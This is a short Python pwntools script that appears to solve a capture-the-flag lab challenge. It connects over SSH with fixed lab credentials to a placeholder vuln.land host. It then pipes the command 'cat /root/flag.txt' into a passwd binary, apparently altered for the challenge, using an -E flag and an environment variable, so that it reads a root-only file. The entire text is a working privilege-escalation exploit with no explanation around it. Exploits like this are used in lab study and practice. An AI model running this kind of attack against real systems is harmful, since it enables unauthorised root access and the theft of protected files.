from pwn import *

r = ssh(user='challenge', password='challenge', host='xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.rdocker.vuln.land')

output = r('echo "cat /root/flag.txt" | SALAMI=https://www.youtube.com/watch?v=dQw4w9WgXcQ passwd -E').decode()
print('\n'.join(output.splitlines()[:2]))
